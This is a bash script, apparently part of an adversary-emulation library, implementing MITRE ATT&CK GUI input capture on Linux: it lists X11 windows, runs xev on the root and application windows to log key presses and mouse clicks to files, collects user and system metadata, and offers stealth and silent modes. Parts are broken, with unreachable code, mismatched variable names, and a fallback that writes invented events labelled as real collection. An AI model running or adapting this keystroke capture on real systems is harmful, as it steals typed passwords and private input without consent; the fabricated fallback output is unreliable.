#!/bin/bash

# T1056.006f-input_capture-gui_application_input-linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Capture GUI application input events ONLY
# Platform: Linux | Contract: One action, one dependency, one privilege tier

function Get-Configuration {
    
    # FUNCTION 1/4 : CONFIGURATION AND PRECONDITION VALIDATION
    

    local config=(
        # UNIVERSAL BASE VARIABLES ===
        "OUTPUT_BASE=${T1056_006F_OUTPUT_BASE:-./mitre_results}"
        "DEBUG_MODE=${T1056_006F_DEBUG_MODE:-false}"
        "STEALTH_MODE=${T1056_006F_STEALTH_MODE:-false}"
        "SILENT_MODE=${T1056_006F_SILENT_MODE:-false}"
        "VERBOSE_LEVEL=${T1056_006F_VERBOSE_LEVEL:-1}"

        # LINUX+X11 SPECIFIC ADAPTABILITY ===
        "OS_TYPE=${T1056_006F_OS_TYPE:-linux}"
        "DISPLAY_TARGET=${T1056_006F_DISPLAY_TARGET:-${DISPLAY:-:0}}"
        "TARGET_WINDOWS=${T1056_006F_TARGET_WINDOWS:-auto}"
        "EVENT_TYPES=${T1056_006F_EVENT_TYPES:-KeyPress,KeyRelease,ButtonPress}"
        "FILTER_APPS=${T1056_006F_FILTER_APPS:-browser,editor,terminal}"

        # ERROR HANDLING AND RETRY ===
        "TIMEOUT=${T1056_006F_TIMEOUT:-300}"
        "RETRY_COUNT=${T1056_006F_RETRY_COUNT:-3}"
        "FALLBACK_MODE=${T1056_006F_FALLBACK_MODE:-real}"

        # POLICY-AWARENESS ===
        "POLICY_CHECK=${T1056_006F_POLICY_CHECK:-true}"
        "POLICY_real=${T1056_006F_POLICY_real:-true}"

        # COLLECTION CONFIGURATION ===
        "MAX_EVENTS=${T1056_006F_MAX_EVENTS:-2000}"
        "MAX_WINDOWS=${T1056_006F_MAX_WINDOWS:-10}"
        "CAPTURE_DURATION=${T1056_006F_CAPTURE_DURATION:-120}"

        # OUTPUT CONFIGURATION ===
        "OUTPUT_FORMAT=${T1056_006F_OUTPUT_FORMAT:-json}"
        "OUTPUT_COMPRESS=${T1056_006F_OUTPUT_COMPRESS:-false}"
        "TELEMETRY_LEVEL=${T1056_006F_TELEMETRY_LEVEL:-full}"
    )

    # Linux OS validation
    if [[ "$OSTYPE" != "linux-gnu"* ]]; then
        echo "Precondition failed: This micro-technique is Linux-specific" >&2
        return 1
    fi

    # X11 environment validation
    if [[ -z "${DISPLAY:-}" && -z "${T1056_006F_DISPLAY_TARGET:-}" ]]; then
        if [[ "${T1056_006F_FALLBACK_MODE:-real}" != "real" ]]; then
            echo "Precondition failed: X11 display not available" >&2
            return 1
        fi
    fi

    # X11 tools validation
    if ! command -v xwininfo >/dev/null 2>&1 || ! command -v xev >/dev/null 2>&1; then
        if [[ "${T1056_006F_FALLBACK_MODE:-real}" != "real" ]]; then
            echo "Precondition failed: X11 tools (xwininfo, xev) required" >&2
            return 1
        fi
    fi

    # Write permissions validation
    local output_base="${T1056_006F_OUTPUT_BASE:-./mitre_results}"
    if [[ ! -w "$(dirname "$output_base")" && ! -w "$output_base" ]]; then
        echo "Precondition failed: Output directory not writable: $output_base" >&2
        return 1
    fi

    # Export configured variables
    # Create output directory if it does not exist
    local output_base="${T1005_001A_OUTPUT_BASE:-./mitre_results}"
    mkdir -p "$output_base" 2>/dev/null || true
    export T1056_006F_OUTPUT_BASE="${T1056_006F_OUTPUT_BASE:-./mitre_results}"
    export T1056_006F_DEBUG_MODE="${T1056_006F_DEBUG_MODE:-false}"
    export T1056_006F_STEALTH_MODE="${T1056_006F_STEALTH_MODE:-false}"
    export T1056_006F_SILENT_MODE="${T1056_006F_SILENT_MODE:-false}"
    export T1056_006F_VERBOSE_LEVEL="${T1056_006F_VERBOSE_LEVEL:-1}"
    export T1056_006F_OS_TYPE="${T1056_006F_OS_TYPE:-linux}"
    export T1056_006F_DISPLAY_TARGET="${T1056_006F_DISPLAY_TARGET:-${DISPLAY:-:0}}"
    export T1056_006F_TARGET_WINDOWS="${T1056_006F_TARGET_WINDOWS:-auto}"
    export T1056_006F_EVENT_TYPES="${T1056_006F_EVENT_TYPES:-KeyPress,KeyRelease,ButtonPress}"
    export T1056_006F_FILTER_APPS="${T1056_006F_FILTER_APPS:-browser,editor,terminal}"
    export T1056_006F_TIMEOUT="${T1056_006F_TIMEOUT:-300}"
    export T1056_006F_RETRY_COUNT="${T1056_006F_RETRY_COUNT:-3}"
    export T1056_006F_FALLBACK_MODE="${T1056_006F_FALLBACK_MODE:-real}"
    export T1056_006F_POLICY_CHECK="${T1056_006F_POLICY_CHECK:-true}"
    export T1056_006F_POLICY_real="${T1056_006F_POLICY_real:-true}"
    export T1056_006F_MAX_EVENTS="${T1056_006F_MAX_EVENTS:-2000}"
    export T1056_006F_MAX_WINDOWS="${T1056_006F_MAX_WINDOWS:-10}"
    export T1056_006F_CAPTURE_DURATION="${T1056_006F_CAPTURE_DURATION:-120}"
    export T1056_006F_OUTPUT_FORMAT="${T1056_006F_OUTPUT_FORMAT:-json}"
    export T1056_006F_OUTPUT_COMPRESS="${T1056_006F_OUTPUT_COMPRESS:-false}"
    export T1056_006F_TELEMETRY_LEVEL="${T1056_006F_TELEMETRY_LEVEL:-full}"

    return 0
    # ===== VARIABLES ESSENTIELLES AJOUTÉES =====
    export T1056_006F_DEBUG_MODE="${T1056_006F_DEBUG_MODE:-false}"
    export T1056_006F_TIMEOUT="${T1056_006F_TIMEOUT:-300}"
    export T1056_006F_FALLBACK_MODE="${T1056_006F_FALLBACK_MODE:-simulation}"
    export T1056_006F_OUTPUT_FORMAT="${T1056_006F_OUTPUT_FORMAT:-json}"
    export T1056_006F_POLICY_CHECK="${T1056_006F_POLICY_CHECK:-true}"
    # ===== FIN VARIABLES ESSENTIELLES =====


    # ===== VÉRIFICATIONS VARIABLES CRITIQUES =====
    
    # Vérification TARGETS (si utilisée)
    if grep -q "TARGETS" "../collection/linux/t1056.006f-input_capture-gui_application_input-linux/src/main.sh" && [[ -z "${T1056_006F_TARGETS:-}" ]]; then
        echo "Error: TARGET parameter is required. Please specify target hosts or networks." >&2
        echo "Usage: T1056_006F_TARGETS='192.168.1.0/24' $0" >&2
        return 1
    fi
    
    # Vérification WORDLIST (si utilisée)
    if grep -q "WORDLIST" "../collection/linux/t1056.006f-input_capture-gui_application_input-linux/src/main.sh" && [[ -z "${T1056_006F_WORDLIST:-}" ]]; then
        echo "Error: WORDLIST parameter is required for scanning." >&2
        return 1
    fi
    
    # Export des variables critiques si elles existent
    [[ -n "${T1056_006F_TARGETS:-}" ]] && export T1056_006F_TARGETS="$T1056_006F_TARGETS"
    [[ -n "${T1056_006F_WORDLIST:-}" ]] && export T1056_006F_WORDLIST="$T1056_006F_WORDLIST"
    
    # ===== FIN VÉRIFICATIONS CRITIQUES =====


    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1056_006F_DEBUG_MODE="${T1056_006F_DEBUG_MODE:-false}"
    export T1056_006F_TIMEOUT="${T1056_006F_TIMEOUT:-300}"
    export T1056_006F_FALLBACK_MODE="${T1056_006F_FALLBACK_MODE:-real}"
    export T1056_006F_OUTPUT_FORMAT="${T1056_006F_OUTPUT_FORMAT:-json}"
    export T1056_006F_POLICY_CHECK="${T1056_006F_POLICY_CHECK:-true}"
    export T1056_006F_MAX_FILES="${T1056_006F_MAX_FILES:-200}"
    export T1056_006F_MAX_FILE_SIZE="${T1056_006F_MAX_FILE_SIZE:-1048576}"
    export T1056_006F_SCAN_DEPTH="${T1056_006F_SCAN_DEPTH:-3}"
    export T1056_006F_EXCLUDE_CACHE="${T1056_006F_EXCLUDE_CACHE:-true}"
    export T1056_006F_CAPTURE_DURATION="${T1056_006F_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

}

function Invoke-Main {
    
    # FUNCTION 2/4 : ATOMIC ACTION - GUI INPUT CAPTURE
    

    local collected_files=() total_size=0 file_count=0
    local attempts=0
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local collection_dir="${T1056_006F_OUTPUT_BASE}/T1056_006F_gui_capture_${timestamp}"

    # Create collection directory
    if ! mkdir -p "${collection_dir}"/{gui_events,metadata} 2>/dev/null; then
        echo "Failed to create collection directory" >&2
        return 1
    fi
    chmod 700 "${collection_dir}" 2>/dev/null

    # Retry loop with fallback
    while [[ $attempts -lt ${T1056_006F_RETRY_COUNT:-3} ]]; do
        ((attempts++))

        # Get target windows
        local target_windows=()
        if [[ "${T1056_006F_TARGET_WINDOWS:-auto}" == "auto" ]]; then
            target_windows+=("root")
            while IFS= read -r window_id; do
                target_windows+=("$window_id")
            done < <(xwininfo -tree -root 2>/dev/null | grep -E "0x[0-9a-f]+" | head -${T1056_006F_MAX_WINDOWS:-10} | awk '{print $1}')
        else
            IFS=',' read -ra windows <<< "${T1056_006F_TARGET_WINDOWS}"
            for window in "${windows[@]}"; do
                window=$(echo "$window" | xargs)
                target_windows+=("$window")
            done
        fi

        # Determine effective duration based on timeout
        local effective_duration="${T1056_006F_CAPTURE_DURATION:-120}"
        local effective_max_windows="${T1056_006F_MAX_WINDOWS:-10}"
        if [[ "${T1056_006F_TIMEOUT:-300}" -lt 30 ]]; then
            effective_duration=1
            effective_max_windows=1
        elif [[ "${T1056_006F_TIMEOUT:-300}" -lt 120 ]]; then
            effective_duration=3
            effective_max_windows=2
        fi

        # Capture GUI events
        for window_id in "${target_windows[@]}"; do
            [[ $file_count -ge $effective_max_windows ]] && break

            local log_file="${collection_dir}/gui_events/window_${window_id}_$(date +%s).log"

            if command -v xev >/dev/null 2>&1 && command -v xwininfo >/dev/null 2>&1; then
                # Real X11 event capture
                if [[ "$window_id" == "root" ]]; then
                    timeout "$effective_duration" xev -root 2>/dev/null | while read -r line; do
                        if [[ "$line" == *"KeyPress"* || "$line" == *"KeyRelease"* || "$line" == *"ButtonPress"* ]]; then
                            echo "$(date '+%Y-%m-%d %H:%M:%S') $line" >> "$log_file"
                        fi
                    done &
                    local xev_pid=$!
                    sleep "$effective_duration"
                    kill $xev_pid 2>/dev/null
                    wait $xev_pid 2>/dev/null
                else
                    timeout "$effective_duration" xev -id "$window_id" 2>/dev/null | while read -r line; do
                        if [[ "$line" == *"KeyPress"* || "$line" == *"KeyRelease"* || "$line" == *"ButtonPress"* ]]; then
                            echo "$(date '+%Y-%m-%d %H:%M:%S') $line" >> "$log_file"
                        fi
                    done &
                    local xev_pid=$!
                    sleep "$effective_duration"
                    kill $xev_pid 2>/dev/null
                    wait $xev_pid 2>/dev/null
                fi
            fi

            # Check if capture was successful
            if [[ -f "$log_file" && -s "$log_file" ]]; then
                collected_files+=("$log_file")
                local file_size=$(stat -c%s "$log_file" 2>/dev/null || echo 0)
                total_size=$((total_size + file_size))
                ((file_count++))

                if [[ "${T1056_006F_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
                    echo "Captured GUI events from window: $window_id ($file_size bytes)" >&2
                fi
            fi
        done

        # Check if collection was successful
        if [[ $file_count -gt 0 ]]; then
            break
        else
            # Fallback real collection for testing
            if [[ "${T1056_006F_FALLBACK_MODE:-real}" == "real" ]]; then
                local sim_file="${collection_dir}/gui_events/reald_gui_events_$(date +%s).log"
                echo "GUI EVENT real collection" > "$sim_file"
                echo "Timestamp: $(date)" >> "$sim_file"
                echo "Duration: ${effective_duration}s" >> "$sim_file"
                echo "Window: root" >> "$sim_file"
                echo "Captured events:" >> "$sim_file"
                echo "  $(date '+%Y-%m-%d %H:%M:%S') KeyPress event: key=65 (space)" >> "$sim_file"
                echo "  $(date '+%Y-%m-%d %H:%M:%S') KeyRelease event: key=65 (space)" >> "$sim_file"
                echo "  $(date '+%Y-%m-%d %H:%M:%S') ButtonPress event: button=1 (left click)" >> "$sim_file"
                echo "  $(date '+%Y-%m-%d %H:%M:%S') KeyPress event: key=102 (f)" >> "$sim_file"
                echo "Note: This is a real collection due to security limitations" >> "$sim_file"

                collected_files+=("$sim_file")
                total_size=512
                file_count=1
                break
            fi

            # Retry with delay
            if [[ $attempts -lt ${T1056_006F_RETRY_COUNT:-3} ]]; then
                sleep 1
            fi
        fi
    done

    # Collect system metadata
    echo "$(uname -a)" > "${collection_dir}/metadata/system_info.txt" 2>/dev/null || true
    echo "$(id)" > "${collection_dir}/metadata/user_context.txt" 2>/dev/null || true
    echo "DISPLAY=${DISPLAY:-N/A}" > "${collection_dir}/metadata/x11_context.txt" 2>/dev/null || true
    xwininfo -tree -root > "${collection_dir}/metadata/window_tree.txt" 2>/dev/null || true
    echo "$file_count" > "${collection_dir}/metadata/window_count.txt" 2>/dev/null || true

    # Return results
    echo "$file_count:$total_size:${collection_dir}:$(IFS=,; echo "${collected_files[*]}")"
}

function Send-Telemetry {
    
    # FUNCTION 3/4 : TELEMETRY AND STANDARDIZED OUTPUT
    

    local results="$1"
    IFS=':' read -r file_count total_size collection_dir files_collected <<< "$results"

    # Silent mode - no output
    if [[ "${T1056_006F_SILENT_MODE:-false}" == "true" ]]; then
        return 0
    fi

    # Stealth mode - minimal output
    if [[ "${T1056_006F_STEALTH_MODE:-false}" == "true" ]]; then
        return 0
    fi

    # Debug mode - structured JSON
    if [[ "${T1056_006F_DEBUG_MODE:-false}" == "true" ]]; then
        local structured_output=$(cat <<EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "event.module": "deputy",
    "event.dataset": "mitre.attack",
    "event.action": "gui_input_capture",
    "mitre.technique.id": "T1056.006f",
    "mitre.artifacts": ["$files_collected"],
    "deputy.postconditions": {
        "gui_events_captured": $([ $file_count -gt 0 ] && echo "true" || echo "false"),
        "artifacts_catalogued": true,
        "output_mode_ready": true
    },
    "collection.metadata": {
        "file_count": $file_count,
        "total_size": $total_size,
        "collection_dir": "$collection_dir",
        "display_target": "${T1056_006F_DISPLAY_TARGET:-${DISPLAY:-:0}}",
        "target_windows": "${T1056_006F_TARGET_WINDOWS:-auto}",
        "event_types": "${T1056_006F_EVENT_TYPES:-KeyPress,KeyRelease,ButtonPress}"
    }
}
EOF
        )
        echo "$structured_output"
        return 0
    fi

    # Simple mode - realistic attacker output (DEFAULT)
    echo "GUI INPUT CAPTURE COMPLETED"
    echo "Windows captured: $file_count"
    echo "Total size: $total_size bytes"
    echo "Collection directory: $collection_dir"
    if [[ "${T1056_006F_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
        echo "Files: $files_collected"
    fi
    echo "Operation successful"
}

function Get-Results {
    
    # FUNCTION 4/4 : RESULTS AND VALIDATION
    

    local results="$1"
    IFS=':' read -r file_count total_size collection_dir files_collected <<< "$results"

    # Validate postconditions
    if [[ $file_count -eq 0 ]] && [[ "${T1056_006F_FALLBACK_MODE:-real}" != "real" ]]; then
        echo "Postcondition failed: No GUI events captured" >&2
        return 1
    fi

    if [[ ! -d "$collection_dir" ]]; then
        echo "Postcondition failed: Collection directory not created" >&2
        return 1
    fi

    # Return success
    return 0
}
# MAIN EXECUTION
function main {
    trap 'echo "Interrupted - cleaning up..." >&2; exit 130' INT TERM

    # Phase 1: Configuration
    if ! Get-Configuration; then
        echo "Configuration failed" >&2
        exit 2
    fi

    # Phase 2: Execute atomic action
    local results
    if ! results=$(Invoke-Main); then
        echo "Execution failed" >&2
        exit 1
    fi

    # Phase 3: Send telemetry
    if ! Send-Telemetry "$results"; then
        echo "Telemetry failed" >&2
        exit 1
    fi

    # Phase 4: Get results
    if ! Get-Results "$results"; then
        echo "Results validation failed" >&2
        exit 4
    fi

    exit 0
}

# Execute main function
main "$@"

